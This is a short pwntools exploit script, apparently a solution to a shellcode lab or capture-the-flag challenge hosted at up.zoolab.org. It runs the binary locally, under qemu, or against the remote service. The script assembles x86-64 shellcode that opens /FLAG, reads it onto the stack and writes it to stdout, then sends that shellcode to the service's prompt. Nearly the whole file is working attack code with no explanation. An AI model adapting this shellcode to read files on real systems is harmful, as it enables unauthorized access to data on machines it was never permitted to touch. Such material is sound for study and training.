#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './shellcode'
port = 10257

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

flag_fn = int.from_bytes(b'/FLAG', 'little')
asm_code = f"""
mov rbx, {flag_fn}
push rbx

mov rax, 0x02
mov rdi, rsp
mov rsi, 0
syscall

mov rdi, rax
mov rax, 0x0
mov rsi, rsp
mov rdx, 40
syscall

mov rax, 0x1
mov rdi, 0x1
syscall

mov rax, 0x3c
mov rdi, 0x0
syscall
"""

sc = asm(asm_code, arch='amd64')

r.sendafter(b"code> ", sc)
print(r.recvall())
